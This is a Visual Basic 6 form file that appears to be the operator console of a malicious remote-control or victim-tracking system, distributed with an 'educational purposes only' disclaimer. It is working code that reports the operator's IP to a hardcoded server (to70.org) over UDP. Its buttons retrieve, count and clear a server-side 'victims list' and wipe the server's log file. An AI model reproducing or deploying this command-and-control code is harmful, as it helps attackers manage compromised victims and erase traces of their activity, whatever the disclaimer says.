VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form formnoty 
   Appearance      =   0  'Flat
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Server Control"
   ClientHeight    =   6690
   ClientLeft      =   -570
   ClientTop       =   -7530
   ClientWidth     =   5595
   Icon            =   "Forme1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6690
   ScaleWidth      =   5595
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame3 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Server control"
      ForeColor       =   &H80000008&
      Height          =   2775
      Left            =   0
      TabIndex        =   19
      Top             =   3840
      Width           =   5535
      Begin Project1.lvButtons_H lvButtons_H13 
         Height          =   375
         Left            =   120
         TabIndex        =   32
         ToolTipText     =   "Clear the old clients"
         Top             =   1800
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Clear old clients list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H15 
         Height          =   375
         Left            =   3120
         TabIndex        =   31
         ToolTipText     =   "Get the client list from server"
         Top             =   1800
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Get client list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H10 
         Height          =   375
         Left            =   3120
         TabIndex        =   27
         ToolTipText     =   "Retrive the victim list from server"
         Top             =   1320
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Get victims list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H12 
         Height          =   375
         Left            =   120
         TabIndex        =   26
         ToolTipText     =   "Clear server's filter list"
         Top             =   1320
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Clear filter list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H11 
         Height          =   375
         Left            =   3120
         TabIndex        =   25
         ToolTipText     =   "Close the server program"
         Top             =   2280
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Shutdown server"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H9 
         Height          =   375
         Left            =   120
         TabIndex        =   24
         ToolTipText     =   "Clear server's client list"
         Top             =   360
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Clear clients list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H8 
         Height          =   375
         Left            =   120
         TabIndex        =   23
         ToolTipText     =   "Clear server's victim list"
         Top             =   840
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Clear victims list"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H7 
         Height          =   375
         Left            =   120
         TabIndex        =   22
         ToolTipText     =   "Clear server's log file"
         Top             =   2280
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Clear server log file"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H6 
         Height          =   375
         Left            =   3120
         TabIndex        =   21
         ToolTipText     =   "Retrive the server status"
         Top             =   840
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Get server status"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H5 
         Height          =   375
         Left            =   3120
         TabIndex        =   20
         ToolTipText     =   "Retrive the number of victims received"
         Top             =   360
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Get number of victims"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Send options"
      ForeColor       =   &H80000008&
      Height          =   3735
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   5535
      Begin Project1.lvButtons_H lvButtons_H14 
         Height          =   375
         Left            =   3600
         TabIndex        =   30
         ToolTipText     =   "reset to default server"
         Top             =   2280
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Reset"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1200
         TabIndex        =   28
         Top             =   2280
         Width           =   2295
      End
      Begin Project1.lvButtons_H lvButtons_H4 
         Height          =   375
         Left            =   3600
         TabIndex        =   18
         ToolTipText     =   "Send the testing text"
         Top             =   360
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.CheckBox Check1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Update server on disconnect"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   17
         ToolTipText     =   "Update the server with this ip if I get disconnected"
         Top             =   2880
         Width           =   2415
      End
      Begin VB.CheckBox Check2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Tray Messages"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   16
         ToolTipText     =   "Show messages on system tray when signals are received"
         Top             =   3240
         Width           =   2355
      End
      Begin VB.OptionButton Option1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Auto"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   4680
         TabIndex        =   15
         ToolTipText     =   "Auto send the local ip"
         Top             =   840
         Width           =   735
      End
      Begin VB.OptionButton Option2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Auto"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   4680
         TabIndex        =   14
         ToolTipText     =   "Auto send the remote ip"
         Top             =   1320
         Width           =   735
      End
      Begin VB.OptionButton Option3 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Auto"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   4680
         TabIndex        =   13
         ToolTipText     =   "Auto send the optional ip"
         Top             =   1800
         Width           =   735
      End
      Begin Project1.lvButtons_H lvButtons_H3 
         Height          =   375
         Left            =   3600
         TabIndex        =   12
         ToolTipText     =   "Send the optional  ip"
         Top             =   1800
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H2 
         Height          =   375
         Left            =   3600
         TabIndex        =   11
         ToolTipText     =   "Send the remote ip"
         Top             =   1320
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H1 
         Height          =   375
         Left            =   3600
         TabIndex        =   10
         ToolTipText     =   "Send the local ip"
         Top             =   840
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.TextBox Text4 
         Appearance      =   0  'Flat
         ForeColor       =   &H00FF0000&
         Height          =   285
         Left            =   1200
         TabIndex        =   9
         Top             =   840
         Width           =   2295
      End
      Begin VB.TextBox Text5 
         Appearance      =   0  'Flat
         ForeColor       =   &H00FF0000&
         Height          =   285
         Left            =   1200
         TabIndex        =   8
         Top             =   1320
         Width           =   2295
      End
      Begin VB.TextBox Text6 
         Appearance      =   0  'Flat
         ForeColor       =   &H00FF0000&
         Height          =   285
         Left            =   1200
         TabIndex        =   7
         Top             =   1800
         Width           =   2295
      End
      Begin VB.TextBox Text3 
         Appearance      =   0  'Flat
         ForeColor       =   &H00FF0000&
         Height          =   285
         Left            =   1200
         MultiLine       =   -1  'True
         TabIndex        =   2
         Text            =   "Forme1.frx":08CA
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label Label5 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Server"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   2280
         Width           =   495
      End
      Begin VB.Label Label4 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Optional ip"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   1800
         Width           =   975
      End
      Begin VB.Label Label3 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Remote ip"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   1320
         Width           =   855
      End
      Begin VB.Label Label2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Local ip"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   840
         Width           =   615
      End
      Begin VB.Label Label1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Text to send"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   360
         Width           =   1815
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Controls"
      Height          =   1215
      Left            =   7320
      TabIndex        =   0
      Top             =   2760
      Width           =   1575
      Begin VB.Timer Timer4 
         Enabled         =   0   'False
         Interval        =   2000
         Left            =   1080
         Top             =   720
      End
      Begin VB.Timer Timer3 
         Interval        =   500
         Left            =   1080
         Top             =   240
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   2000
         Left            =   600
         Top             =   240
      End
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   600
         Top             =   720
      End
      Begin MSWinsockLib.Winsock Winsock2 
         Left            =   120
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   120
         Top             =   720
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
   End
End
Attribute VB_Name = "formnoty"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Option Explicit
Dim serverHost As String


Private Sub Form_Load()
   
  
    'get saved info get info from registry
    
    
    Text1.Text = Trim(GetSetting(Me.name, "formnoty", "notytext1"))
    If Text1.Text = "" Then
        Text1.Text = "to70.org"
    End If
    serverHost = Text1.Text
    
    
    
    
    Dim tempregvalue As String
    tempregvalue = Trim(GetSetting(Me.name, "formnoty", "check1"))
    
       
    If (tempregvalue = "1") Then
        Check1.Value = 1
    Else
        Check1.Value = 0
    End If

 
 
    
    
    tempregvalue = GetSetting(Me.name, "formnoty", "check2")
    If (tempregvalue = "1") Then
        Check2.Value = 1
    Else
        Check2.Value = 0
    End If

 
    tempregvalue = GetSetting(Me.name, "formnoty", "option3")
    If (tempregvalue = "True") Then
        Option3.Value = True
    End If
     
    
     tempregvalue = GetSetting(Me.name, "formnoty", "option2")
    If (tempregvalue = "True") Then
        Option2.Value = True
    End If
     
    tempregvalue = GetSetting(Me.name, "formnoty", "option1")
    If (tempregvalue = "True") Then
        Option1.Value = True
    End If
     
   
    
    With Winsock1
        .Protocol = sckUDPProtocol
        .RemotePort = 65
        .RemoteHost = serverHost
    End With
     
    
    With Winsock2
        .Protocol = sckUDPProtocol
        .RemotePort = 65
        .RemoteHost = serverHost
    End With

    
    'get ips
    Text4.Text = Winsock1.localip
    Text5.Text = Trim(OpenURL("http://to70.net/wolf/myip.php"))
    Text6.Text = Trim(GetSetting(Me.name, "formnoty", "text6"))
       
    Timer1.Enabled = True
    
   
    

End Sub



Private Sub Form_Unload(Cancel As Integer)
      'save settings to registry
      SaveSetting Me.name, "formnoty", "check1", Check1.Value
      SaveSetting Me.name, "formnoty", "check2", Check2.Value
      SaveSetting Me.name, "formnoty", "option3", Option3.Value
      SaveSetting Me.name, "formnoty", "option2", Option2.Value
      SaveSetting Me.name, "formnoty", "option1", Option1.Value
      SaveSetting Me.name, "formnoty", "text6", Text6.Text
      SaveSetting Me.name, "formnoty", "notytext1", Text1.Text
      Me.Hide
      Cancel = 1
End Sub

Private Sub Frame2_DragDrop(Source As Control, X As Single, Y As Single)

End Sub

Private Sub lvButtons_H1_Click()
    sendlocalip
End Sub

Public Sub sendlocalip()
    Winsock1.RemoteHost = serverHost
    On Error Resume Next
    Winsock1.SendData "542891|" & Text4.Text & "|" & frmLogin.txtUserName & "|Sending local ip manually"

End Sub

Private Sub lvButtons_H10_Click()
    
    getvictimlist
End Sub

Public Sub getvictimlist()
    Form7.lstWin.ListItems.Clear

    With Form1.Winsock3
         
        .RemotePort = 111
        .RemoteHost = serverHost
        On Error Resume Next
        .Bind
     End With
    
    
    Form1.Winsock3.SendData "victimlist"

End Sub



Public Sub getoldlist()
    
    With Form1.Winsock3
         
        .RemotePort = 111
        .RemoteHost = serverHost
        On Error Resume Next
        .Bind
     End With
    
    
    Form1.Winsock3.SendData "oldlist"

End Sub


Public Sub getclientlist()

    Form7.lstWin2.ListItems.Clear
    With Form1.Winsock3
         
        .RemotePort = 111
        .RemoteHost = serverHost
        On Error Resume Next
        .Bind
     End With
    
    
    Form1.Winsock3.SendData "clientlist"

End Sub

Private Sub lvButtons_H11_Click()
    
    Dim notysound As Integer
    notysound = MsgBox("Exit the program,Are you sure?", vbYesNo)

    If notysound = 6 Then '6 indicates a YES
        Winsock1.RemoteHost = serverHost
        Winsock1.SendData "shutdown"
                        
    End If
    
    
End Sub

Private Sub lvButtons_H12_Click()
    Winsock1.SendData "clearfillter"
End Sub

Private Sub lvButtons_H13_Click()
    Winsock1.SendData "clearlist1"
End Sub

Private Sub lvButtons_H14_Click()
    Text1.Text = "to70.org"
End Sub

Private Sub lvButtons_H15_Click()
   
    getclientlist
End Sub

Private Sub lvButtons_H2_Click()
    sendremoteip
End Sub

'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Public Sub sendremoteip()
    Winsock1.RemoteHost = serverHost
    On Error Resume Next
    Winsock1.SendData "542891|" & Text5.Text & "|" & frmLogin.txtUserName & "|Sending remote ip manually"

End Sub

Private Sub lvButtons_H3_Click()
    sendoptionalip
End Sub

Public Sub sendoptionalip()
    Winsock1.RemoteHost = serverHost
    On Error Resume Next
    Winsock1.SendData "542891|" & Text6.Text & "|" & frmLogin.txtUserName & "|Sending optional ip manually"

End Sub

Private Sub lvButtons_H4_Click()
        Winsock1.RemoteHost = serverHost
        If Option1.Value = True Then
            Winsock1.SendData Text4 & "|" & frmLogin.txtUserName & "|" & Trim(Text3.Text)
        ElseIf Option2.Value = True Then
            Winsock1.SendData Text5 & "|" & frmLogin.txtUserName & "|" & Trim(Text3.Text)
        ElseIf Option3.Value = True Then
            Winsock1.SendData Text6 & "|" & frmLogin.txtUserName & "|" & Trim(Text3.Text)
        End If
End Sub

Private Sub lvButtons_H5_Click()
    With Form1.Winsock3
        .RemotePort = 111
        .RemoteHost = serverHost
        On Error Resume Next
        .Bind
     End With
     Form1.Winsock3.SendData "getcount"
End Sub

Private Sub lvButtons_H6_Click()
    With Form1.Winsock3
         
        .RemotePort = 111
        .RemoteHost = serverHost
        On Error Resume Next
        .Bind
     End With
     
     Form1.Winsock3.SendData "getstatus"
End Sub

Private Sub lvButtons_H7_Click()
    Winsock1.RemoteHost = serverHost
    Winsock1.SendData "clearlog"
End Sub

Private Sub lvButtons_H8_Click()
     Winsock1.RemoteHost = serverHost
    Winsock1.SendData "clearallcus"
End Sub

Private Sub lvButtons_H9_Click()
     Winsock1.RemoteHost = serverHost
    Winsock1.SendData "clearallwol"
End Sub

Private Sub Text1_LostFocus()
    serverHost = Text1.Text
End Sub

Private Sub Timer1_Timer()

    'check if user loggged in or not
    If frmLogin.allowthem = True Then
        Winsock1.RemoteHost = serverHost
        On Error Resume Next
        If Option1.Value = True Then
            Winsock1.SendData "542891|" & Text4 & "|" & frmLogin.txtUserName & "|Logged in"
        ElseIf Option2.Value = True Then
            Winsock1.SendData "542891|" & Text5 & "|" & frmLogin.txtUserName & "|Logged in"
        ElseIf Option3.Value = True Then
            Winsock1.SendData "542891|" & Text6 & "|" & frmLogin.txtUserName & "|Logged in"
        Else
             Winsock1.SendData "542891|" & Text5 & "|" & frmLogin.txtUserName & "|Logged in"
        End If
        

        Timer1.Enabled = False
        Timer4.Enabled = True
    End If
End Sub


'check if connected
Private Sub Timer2_Timer()

    If IsConnected = True Then
    
    
        Text5.Text = Trim(OpenURL("http://to70.net/wolf/myip.php"))
   

        With Winsock1
            .RemotePort = 65
            .RemoteHost = serverHost
        End With

       
        If Option1.Value = True Then
            Winsock1.SendData "542891|" & Text4 & "|" & frmLogin.txtUserName & "|Logged in"
        ElseIf Option2.Value = True Then
            Winsock1.SendData "542891|" & Text5 & "|" & frmLogin.txtUserName & "|Logged in"
        ElseIf Option3.Value = True Then
            Winsock1.SendData "542891|" & Text6 & "|" & frmLogin.txtUserName & "|Logged in"
        End If
    

        Timer2.Enabled = False
        Timer3.Enabled = True
        
    End If

End Sub

'connection checker
Public Function IsConnected() As Boolean
    Dim TRasCon(255) As RASCONN95
    Dim lg As Long
    Dim lpcon As Long
    Dim RetVal As Long
    Dim Tstatus As RASCONNSTATUS95
    '
    TRasCon(0).dwSize = 412
    lg = 256 * TRasCon(0).dwSize
    '
    RetVal = RasEnumConnections(TRasCon(0), lg, lpcon)
    If RetVal <> 0 Then
       ' MsgBox "ERROR"
        Exit Function
    End If
    
    Tstatus.dwSize = 160
    RetVal = RasGetConnectStatus(TRasCon(0).hRasCon, Tstatus)
    If Tstatus.RasConnState = &H2000 Then
        IsConnected = True
    Else
        IsConnected = False
    End If

End Function

'check if disconnected
Private Sub Timer3_Timer()
    If Check1.Value = 1 Then
        If IsConnected = False Then
            Timer2.Enabled = True
            Timer3.Enabled = False
        End If
    End If
End Sub

Private Sub Timer4_Timer()
    On Error Resume Next
    Winsock2.SendData "#" & frmLogin.txtUserName & "  Logged in"
    Timer4.Enabled = False
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

